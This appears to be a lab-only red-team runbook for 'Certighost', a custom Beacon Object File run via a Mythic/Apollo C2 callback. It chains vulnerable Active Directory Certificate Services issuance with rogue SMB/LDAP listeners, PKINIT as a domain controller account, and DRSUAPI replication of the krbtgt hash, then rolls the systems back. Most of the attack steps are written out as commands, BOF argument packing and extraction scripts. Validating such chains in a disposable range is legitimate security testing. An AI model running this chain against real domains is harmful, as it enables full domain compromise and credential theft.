# Manual full-chain validation

This lab-only runbook validates the Certighost BOF through certificate issuance, PKINIT, and a narrowly scoped replication proof. Use it only in an authorized disposable range. It intentionally uses placeholders instead of operation identifiers, local artifact paths, credentials, timestamps, or runtime secret values.

The chain proves:

1. BOF issuance on a vulnerable Enterprise CA.
2. Continuity between the caller-generated private key and issued certificate.
3. PKINIT as the selected domain controller machine account.
4. One-account DRSUAPI replication of `krbtgt` only.
5. Destruction of transient secrets and rollback of the DC and CA.

Do not substitute another target or broaden the replication query beyond `krbtgt`.

## Operator placeholders

Set these values for the authorized operation without recording secret material in this document:

```sh
export REPO_DIR='<CERTIGHOST_REPOSITORY>'
export HARNESS_DIR='<APPROVED_VALIDATION_HARNESS>'
export RUN_DIR='<EPHEMERAL_RUN_DIRECTORY>'
export CALLBACK_ID='<MYTHIC_CALLBACK_ID>'
export CALLBACK_HOST='<ROGUE_LISTENER_HOST_OR_IP>'
export CA_CONFIG='<CA_HOST>\<CA_NAME>'
export TEMPLATE='<ENROLLABLE_MACHINE_TEMPLATE>'
export TARGET_DC_DNS='<TARGET_DC_FQDN>'
export TARGET_DC_ACCOUNT='<TARGET_DC_NETBIOS>$'
export REALM='<AD_REALM>'

mkdir -p "$RUN_DIR/runtime-secrets"
cd "$REPO_DIR"
```

Verify that the selected callback is Windows x64, runs in the intended enrollment identity, and has Apollo `execute_coff` version `3`. Record the identity as evidence without copying credentials or tokens.

## 1. Build the reviewed BOF

```sh
cd "$REPO_DIR"
make bof
shasum -a 256 build/certighost.x64.o
```

Compare the digest with the reviewed artifact record for the current commit. Stop if it differs; do not rely on a digest copied from an earlier run.

## 2. Generate a fresh key and CSR

```sh
openssl req -new -newkey rsa:2048 -nodes \
  -keyout "$RUN_DIR/runtime-secrets/impact.key" \
  -out "$RUN_DIR/runtime-secrets/impact.csr.pem" \
  -subj '/CN=<CONTROLLED_REQUESTER_FQDN>' \
  -addext 'subjectAltName=DNS:<CONTROLLED_REQUESTER_FQDN>'

openssl req -in "$RUN_DIR/runtime-secrets/impact.csr.pem" -outform DER \
  -out "$RUN_DIR/runtime-secrets/impact.csr.der"
openssl req -in "$RUN_DIR/runtime-secrets/impact.csr.pem" -noout -verify -subject
chmod 600 "$RUN_DIR/runtime-secrets/impact.key"
```

Keep the private key only in the ephemeral run directory. PKINIT requires the key matching the issued certificate.

## 3. Start the scoped rogue listeners

Use the approved harness to start the rogue SMB/LSA and LDAP services. If the callback host also carries C2 traffic on TCP/445, preserve that transport with the validated HTTP/SMB multiplexer.

Required listener evidence:

```text
<CALLBACK_HOST>:445 listening
<CALLBACK_HOST>:389 listening
```

Capture only listener state and callback metadata. Do not retain authentication material obtained by the listeners.

## 4. Pack the exact six BOF arguments

The `go` entrypoint requires one little-endian `u32` outer payload length followed by exactly six little-endian length-prefixed binary fields, in this order:

| Position | Field | Exact semantics |
| --- | --- | --- |
| 1 | `csr_der` | Non-empty DER PKCS#10 request bytes, at most 256 KiB, with a bounded outer DER `SEQUENCE` |
| 2 | `ca_config` | ASCII CA configuration string in `host\CAName` form, at most 512 bytes |
| 3 | `template` | Printable ASCII certificate template value without `:` or newlines, at most 128 bytes |
| 4 | `san_dns` | Optional DNS SAN value without the `dns=` prefix; otherwise DNS/IP-like ASCII, at most 255 bytes |
| 5 | `cdc` | Required DNS/IP-like chase callback host value, at most 255 bytes |
| 6 | `rmd` | Required DNS/IP-like remote-domain/principal lookup DNS value, at most 255 bytes |

Equivalent Beacon packing is:

```sleep
$args = bof_pack($bid, "bbbbbb",
    $csr_der,
    $ca_config,
    $template,
    $san_dns,
    $cdc,
    $rmd);
```

Generate a describe-only Apollo task locally:

```sh
cd "$REPO_DIR"
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic describe-task \
  --callback-id "$CALLBACK_ID" \
  --agent-version '<APOLLO_VERSION>' \
  --coff-object build/certighost.x64.o \
  --csr-der "$RUN_DIR/runtime-secrets/impact.csr.der" \
  --ca-config "$CA_CONFIG" \
  --template "$TEMPLATE" \
  --san-dns "$TARGET_DC_DNS" \
  --cdc "$CALLBACK_HOST" \
  --rmd "$TARGET_DC_DNS" \
  --output "$RUN_DIR/task-descriptor.json"

jq -r .operator_command "$RUN_DIR/task-descriptor.json"
```

Use the reviewed `certighost.x64.o` already cached for the selected callback, or register it through the operation's approved Apollo workflow. Do not place a Mythic task ID, file UUID, or callback ID in persistent documentation.

Successful issuance must contain:

```text
CERTIGHOST_RESULT disposition=3
CERTIGHOST_CERT_BEGIN
...
CERTIGHOST_CERT_END
```

Save the complete task output in the ephemeral run directory. Stop if disposition is not `3`.

## 5. Extract and validate the certificate

```sh
python3 - "$RUN_DIR/mythic-output.txt" "$RUN_DIR/runtime-secrets/impact.cer" <<'PY'
import base64
import pathlib
import re
import sys

text = pathlib.Path(sys.argv[1]).read_text()
match = re.search(r"CERTIGHOST_CERT_BEGIN\s*(.*?)\s*CERTIGHOST_CERT_END", text, re.S)
if not match:
    raise SystemExit("certificate markers not found")
pathlib.Path(sys.argv[2]).write_bytes(
    base64.b64decode("".join(match.group(1).split()), validate=True)
)
PY

openssl x509 -inform DER -in "$RUN_DIR/runtime-secrets/impact.cer" \
  -out "$RUN_DIR/runtime-secrets/impact.pem"
openssl x509 -in "$RUN_DIR/runtime-secrets/impact.pem" -noout \
  -subject -issuer -serial -ext subjectAltName

openssl pkey -in "$RUN_DIR/runtime-secrets/impact.key" -pubout -outform DER | shasum -a 256
openssl x509 -in "$RUN_DIR/runtime-secrets/impact.pem" -pubkey -noout | \
  openssl pkey -pubin -outform DER | shasum -a 256
```

The two SPKI hashes must match. Then create a transient lab-only PFX for the approved PKINIT harness:

```sh
openssl pkcs12 -export \
  -inkey "$RUN_DIR/runtime-secrets/impact.key" \
  -in "$RUN_DIR/runtime-secrets/impact.pem" \
  -out "$RUN_DIR/runtime-secrets/impact.pfx" \
  -passout pass:
chmod 600 "$RUN_DIR/runtime-secrets/impact.pfx"
```

Do not copy the key or PFX into evidence bundles.

## 6. Prepare and prove PKINIT

If the disposable DC baseline lacks PKINIT prerequisites, use the approved harness to import the lab CA trust, populate NTAuth, enroll or install the temporary KDC certificate, restart KDC, and synchronize attacker time. These changes must be covered by the DC rollback snapshot.

Run the approved PKINIT harness with the transient PFX. Required sanitized evidence is:

```text
principal = <TARGET_DC_ACCOUNT>@<REALM>
as_rep_tgt_obtained = true
ccache_bytes > 0
```

Retain only the principal and success metadata. Keep the ccache ephemeral and exclude it from reports and commits.

## 7. Prove krbtgt-only replication authority

Use the TGT only for the separately authorized DRSUAPI control that requests one account:

```text
requested_account = krbtgt
account_result_count = 1
rid = 502
nt_hash_present = true
broad_dump_performed = false
```

This is the Tier-Zero impact proof. Do not request additional accounts, perform a broad dump, or copy the raw hash into task output, chat, reports, or persistent notes.

## 8. Cleanup and rollback

First stop listeners and use the approved harness to delete the PFX, ccache, replication output, capture material, and any transient credential output. Restore attacker time if it was changed.

Destroy the ephemeral local secret files:

```sh
find "$RUN_DIR/runtime-secrets" -type f -exec sh -c \
  'for f; do dd if=/dev/zero of="$f" bs=1m count=1 conv=notrunc 2>/dev/null || true; rm -f "$f"; done' sh {} +
rmdir "$RUN_DIR/runtime-secrets" 2>/dev/null || true
rm -f "$RUN_DIR/task-descriptor.json" "$RUN_DIR/mythic-output.txt"
```

Revert both disposable systems to their recorded baselines:

```sh
ludus snapshots revert <DC_PRE_PKINIT_SNAPSHOT> --vmids <DC_VMID>
ludus snapshots revert <CA_PRE_VALIDATION_SNAPSHOT> --vmids <CA_VMID>
```

Verify all of the following before closing the run:

- DC KDC, NTDS, and Netlogon services are running.
- Temporary CA root, NTAuth cache entry, and KDC certificate are absent.
- CA CertSvc, Netlogon, and RPC services are running.
- CA secure channel and RPC health checks pass.
- The impact request is absent after snapshot revert.
- The vulnerable chase flag has returned to the intended disposable baseline.
- The operation callback and listener processes no longer exist.

A subsequent validation must use a fresh callback, CSR, key, and ephemeral run directory.
